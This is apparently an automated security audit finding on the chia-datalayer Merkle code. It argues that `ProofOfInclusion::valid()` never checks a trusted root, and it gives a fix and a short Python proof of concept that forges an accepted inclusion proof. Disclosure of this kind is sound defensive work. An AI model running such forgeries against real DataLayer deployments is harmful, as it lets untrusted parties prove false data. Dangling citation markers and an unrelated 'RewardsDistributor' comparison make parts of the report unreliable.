### Title
`ProofOfInclusion::valid()` Final Root Check Is a Tautology — Forged Inclusion Proofs Always Pass - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` in the DataLayer Merkle implementation contains a loop that accumulates hashes layer-by-layer, but the final root comparison is a logical tautology: it compares `existing_hash` against `self.root_hash()`, which is derived from the proof's own last `combined_hash` — the same value `existing_hash` was just set to inside the loop. The function therefore only verifies internal self-consistency of the proof, never binding it to any external trusted root. An attacker can construct a fully forged `ProofOfInclusion` for any arbitrary key-value pair, and `valid()` returns `true`.

### Finding Description

`ProofOfInclusion::valid()` is the sole validation method for DataLayer Merkle inclusion proofs:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;   // ← set to calculated_hash
    }

    existing_hash == self.root_hash()      // ← always true after the loop
}
``` [1](#0-0) 

`root_hash()` is defined as:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← the last layer's combined_hash
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

**The tautology:** After the loop body executes for the last layer:
1. `existing_hash = calculated_hash` (line 54)
2. The loop guard verified `calculated_hash == layer.combined_hash` (line 50)
3. Therefore `existing_hash == last.combined_hash`
4. `self.root_hash()` returns `last.combined_hash`
5. The final check `existing_hash == self.root_hash()` is **always `true`** when the loop completes without returning `false`

The function never compares the computed root against any external, trusted root. It only verifies that the proof's own layers are internally consistent with each other.

This is structurally analogous to the `RewardsDistributor` bug: a loop iterates over ordered items (layers instead of boost periods), accumulates state across iterations, but the final boundary check is wrong — in this case, comparing against the proof's own last value rather than an external reference, making the check meaningless.

### Impact Explanation

`ProofOfInclusion` is a `Streamable` type exposed via Python bindings: [3](#0-2) [4](#0-3) 

An attacker can construct a forged `ProofOfInclusion` for any arbitrary `node_hash` (claiming any key-value pair is in the tree) with a single layer:

- `node_hash` = attacker-chosen fake leaf hash
- `other_hash` = any 32-byte value
- `other_hash_side` = any side
- `combined_hash` = `calculate_internal_hash(node_hash, side, other_hash)` (computed by the attacker)

The loop computes `calculated_hash = calculate_internal_hash(node_hash, side, other_hash) = combined_hash`, the check passes, `existing_hash = combined_hash`, and the final check `existing_hash == root_hash()` = `combined_hash == combined_hash` = `true`.

All callers — including the fuzz target, Rust tests, and Python tests — only call `valid()` without separately comparing `root_hash()` against a known on-chain commitment: [5](#0-4) [6](#0-5) 

This enables an attacker to prove false inclusion of any key-value pair in the DataLayer tree, which maps to: **High. DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state.**

### Likelihood Explanation

Likelihood is **High**:
- `valid()` is the only validation method on `ProofOfInclusion` and its name implies completeness
- Every existing caller (Rust tests, Python tests, fuzz target) calls only `valid()` with no separate root check
- `ProofOfInclusion` is a `Streamable` type deserializable from bytes, making it trivially constructable by an attacker
- No documentation warns that `root_hash()` must be separately compared against a trusted on-chain root

### Recommendation

The `valid()` method must accept an expected root hash parameter and compare the computed root against it:

```rust
pub fn valid(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    &existing_hash == expected_root
}
```

All callers must supply the trusted root (e.g., from the on-chain DataLayer commitment). The `root_hash()` helper can remain for informational use but must not be used as the validation target.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer, Side
from hashlib import sha256

# Attacker wants to forge a proof that fake_leaf_hash is in the tree
fake_leaf_hash = bytes([0xAA] * 32)
other_hash     = bytes([0xBB] * 32)
side           = 1  # Side.Right

# Compute combined_hash the same way calculate_internal_hash does
combined_hash = sha256(b"\x02" + fake_leaf_hash + other_hash).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=side,
    other_hash=other_hash,
    combined_hash=combined_hash,
)

forged_proof = ProofOfInclusion(node_hash=fake_leaf_hash, layers=[layer])

# valid() returns True for a completely forged proof
assert forged_proof.valid(), "Forged proof accepted!"
# root_hash() is the attacker-controlled combined_hash, not the real tree root
print("Forged root:", forged_proof.root_hash().hex())
```
